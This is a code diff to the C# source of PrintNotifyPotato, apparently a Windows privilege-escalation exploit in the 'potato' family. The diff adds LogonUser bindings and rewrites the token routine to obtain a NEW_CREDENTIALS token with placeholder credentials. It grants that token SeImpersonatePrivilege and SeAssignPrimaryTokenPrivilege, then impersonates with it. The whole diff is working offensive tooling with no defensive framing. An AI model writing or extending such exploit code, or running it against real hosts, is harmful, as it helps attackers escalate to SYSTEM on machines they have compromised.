@@ -169,6 +169,25 @@ namespace PrintNotifyPotato
             PROFILE_SERVER = 0x40000000,
             CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
         }
+        [Flags]
+        public enum LogonType
+        {
+            LOGON32_LOGON_INTERACTIVE = 2,
+            LOGON32_LOGON_NETWORK,
+            LOGON32_LOGON_BATCH,
+            LOGON32_LOGON_SERVICE = 5,
+            LOGON32_LOGON_UNLOCK = 7,
+            LOGON32_LOGON_NETWORK_CLEARTEXT,
+            LOGON32_LOGON_NEW_CREDENTIALS
+        }
+        [Flags]
+        public enum LogonProvider
+        {
+            LOGON32_PROVIDER_DEFAULT = 0,
+            LOGON32_PROVIDER_WINNT35,
+            LOGON32_PROVIDER_WINNT40,
+            LOGON32_PROVIDER_WINNT50
+        }
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct STARTUPINFO
@@ -288,6 +307,8 @@ namespace PrintNotifyPotato
         public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
         [DllImport("Kernel32", SetLastError = true)]
         public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);
+        [DllImport("ADVAPI32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool LogonUser(string lpszUsername,string lpszDomain,string lpszPassword, LogonType dwLogonType,LogonProvider dwLogonProvider, ref IntPtr hToken);
 
         public static bool TryAddTokenPriv(IntPtr token, string privName)
         {
@@ -713,23 +734,27 @@ namespace PrintNotifyPotato
         }
         public static IntPtr GetThreadToken()
         {
-            IntPtr token;
-            IntPtr currentThread = NativeMethods.GetCurrentThread();
-            if (!OpenThreadToken(currentThread, TokenAccessLevels.AllAccess, true, out token))
+            IntPtr hToken = IntPtr.Zero;
+            if (!LogonUser("PrintNotifyPotato", ".","PrintNotifyPotato", LogonType.LOGON32_LOGON_NEW_CREDENTIALS, LogonProvider.LOGON32_PROVIDER_WINNT50, ref hToken))
             {
-                if (ImpersonateSelf(SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                IntPtr currentThread = NativeMethods.GetCurrentThread();
+                if (!OpenThreadToken(currentThread, TokenAccessLevels.AllAccess, true, out hToken))
                 {
-                    if (!OpenThreadToken(currentThread, TokenAccessLevels.AllAccess, true, out token))
+                    if (ImpersonateSelf(SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                    {
+                        if (!OpenThreadToken(currentThread, TokenAccessLevels.AllAccess, true, out hToken))
+                        {
+                            return IntPtr.Zero;
+                        }
+                    }
+                    else
                     {
                         return IntPtr.Zero;
                     }
                 }
-                else
-                {
-                    return IntPtr.Zero;
-                }
+                Console.WriteLine($"[!] LogonUser failed with error code {Marshal.GetLastWin32Error()} \n");
             }
-            return token;
+            return hToken;
         }
 
         static void Main(string[] args)
@@ -776,11 +801,14 @@ Example:
             }
 
 
+            WindowsImpersonationContext impersonationContext = null;
             IntPtr defaultToken = GetThreadToken();
             if (defaultToken != IntPtr.Zero)
             {
+                
                 TryAddTokenPriv(defaultToken, "SeImpersonatePrivilege");
                 TryAddTokenPriv(defaultToken, "SeAssignPrimaryTokenPrivilege");
+                impersonationContext = WindowsIdentity.Impersonate(defaultToken);
                 CloseHandle(defaultToken);
             }
 
@@ -905,6 +933,14 @@ Example:
             catch (Exception e)
             {
                 Console.WriteLine(e);
+            }
+            finally {
+                if (impersonationContext!=null)
+                {
+                    impersonationContext.Undo();
+                    impersonationContext.Dispose();
+                }
+            
             }
         }
     }
